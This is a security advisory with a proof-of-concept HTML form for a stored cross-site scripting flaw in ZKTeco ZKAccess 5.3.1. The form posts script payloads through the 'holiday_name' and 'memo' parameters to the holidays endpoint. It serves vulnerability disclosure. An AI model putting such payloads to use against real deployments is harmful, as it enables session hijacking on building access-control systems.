@@ -1,0 +1,57 @@
+﻿<!--
+
+ZKTeco ZKAccess Security System 5.3.1 Stored XSS Vulnerability
+
+
+Vendor: ZKTeco Inc. | Xiamen ZKTeco Biometric Identification Technology Co.,ltd
+Product web page: http://www.zkteco.com
+Affected version: 5.3.12252
+
+Summary: ZKAccess Systems are built on flexible, open technology to provide
+management, real-time monitoring, and control of your access control system-all
+from a browser, with no additional software to install. Our secure Web-hosted
+infrastructure and centralized online administration reduce your IT costs and
+allow you to easily manage all of your access points in a single location. C3-100's
+versatile design features take care of present and future needs with ease and
+efficiency. It is one of the most rugged and reliable controllers on the market,
+with a multitude of built-in features. The C3-100 can communicate at 38.4 Kbps
+via RS-485 configuration or Ethernet TCP/IP networks. It can store up to 30,000
+cardholders.
+
+Desc: Input passed to the 'holiday_name' and 'memo' POST parameters is not properly
+sanitised before being returned to the user. This can be exploited to execute
+arbitrary HTML and script code in a user's browser session in context of an affected
+site.
+
+Tested on: CherryPy/3.1.0beta3 WSGI Server
+           Firmware: AC Ver 4.1.9 3893-07 Jan 6 2016
+           Python 2.6
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5368
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5368.php
+
+
+18.07.2016
+
+-->
+
+
+<html>
+  <body>
+    <form action="http://127.0.0.1/data/iaccess/AccHolidays/_new_/?_lock=1" method="POST">
+      <input type="hidden" name="pk" value="None" />
+      <input type="hidden" name="holiday&#95;name" value=""><script>alert&#40;1&#41;<&#47;script>" />
+      <input type="hidden" name="holiday&#95;type" value="1" />
+      <input type="hidden" name="start&#95;date" value="09&#47;13&#47;2016" />
+      <input type="hidden" name="end&#95;date" value="10&#47;18&#47;2016" />
+      <input type="hidden" name="loop&#95;by&#95;year" value="2" />
+      <input type="hidden" name="memo" value=""><script>alert&#40;2&#41;<&#47;script>" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
